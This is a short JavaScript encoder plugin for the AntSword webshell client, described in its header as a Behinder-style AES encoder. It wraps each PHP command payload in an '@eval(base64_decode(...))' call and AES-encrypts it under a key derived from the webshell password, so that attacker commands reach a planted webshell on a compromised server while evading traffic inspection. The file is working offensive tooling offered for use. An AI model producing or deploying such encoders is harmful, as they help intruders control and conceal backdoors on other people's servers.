/**
 * php:: behinder AES 编码器
 * Create at: 2021/01/10 01:10:53
 * 
 */

'use strict';
var CryptoJS = require('crypto-js');

function decryptText(keyStr, text) {
  let buff = Buffer.alloc(16, 'a');
  buff.write(keyStr,0);
  keyStr = buff.toString();
  let decodetext = CryptoJS.AES.decrypt(text, CryptoJS.enc.Utf8.parse(keyStr), {
    mode: CryptoJS.mode.CBC,
    padding: CryptoJS.pad.Pkcs7,
    iv: CryptoJS.enc.Utf8.parse(Buffer.alloc(16)),
  }).toString(CryptoJS.enc.Utf8);
  return decodetext;
}

function encryptText(keyStr, text) {
  let buff = Buffer.alloc(16, 'a');
  buff.write(keyStr,0);
  keyStr = buff.toString();
  let encodetext = CryptoJS.AES.encrypt(text, CryptoJS.enc.Utf8.parse(keyStr), {
    mode: CryptoJS.mode.CBC,
    padding: CryptoJS.pad.Pkcs7,
    iv: CryptoJS.enc.Utf8.parse(Buffer.alloc(16)),
  }).toString();
  return encodetext;
}

/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data, ext={}) => {
  let randomID;
  if (ext.opts.otherConf['use-random-variable'] === 1) {
    randomID = antSword.utils.RandomChoice(antSword['RANDOMWORDS']);
  } else {
    randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
  }
  let key = CryptoJS.MD5(pwd).toString().substr(0,16);
  data[pwd] = encryptText(key, `${randomID}|@eval(base64_decode("${Buffer.from(data['_']).toString("base64")}"));`);
  delete data['_'];
  return data;
}
